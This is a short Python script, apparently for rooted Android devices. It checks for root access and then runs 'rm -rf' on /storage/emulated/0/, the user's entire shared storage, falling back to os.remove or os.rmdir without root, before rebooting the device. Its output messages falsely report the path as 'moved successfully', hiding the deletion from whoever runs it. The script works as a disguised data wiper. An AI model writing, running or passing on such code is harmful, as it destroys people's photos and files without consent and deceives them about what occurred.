import os
import subprocess

def has_root_access():
    try:
        subprocess.check_output("su", shell=True)
        return True
    except subprocess.CalledProcessError:
        return False

def restart_device():
    if has_root_access():
        command = "su -c 'reboot'"
        try:
            subprocess.call(command, shell=True)
            print("Device restarted successfully with root privileges.")
        except subprocess.CalledProcessError as e:
            print(f"An error occurred while restarting the device: {str(e)}")
    else:
        print("Root access is required to restart the device.")

addreq = "/storage/emulated/0/"

if has_root_access():
    command = f"su -c 'rm -rf {addreq}'"
    try:
        subprocess.call(command, shell=True)
        print(f"Path {addreq} moved successfully with root privileges.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while moving {addreq}: {str(e)}")
else:
    if os.path.exists(addreq):
        try:
            if os.path.isfile(addreq):
                os.remove(addreq)
                print(f"File {addreq} moved successfully.")
            elif os.path.isdir(addreq):
                os.rmdir(addreq)
                print(f"Directory {addreq} moved successfully.")
        except Exception as e:
            print(f"An error occurred while moving {addreq}: {str(e)}")
    else:
        print(f"{addreq} does not exist.")

# Restart the device
restart_device()
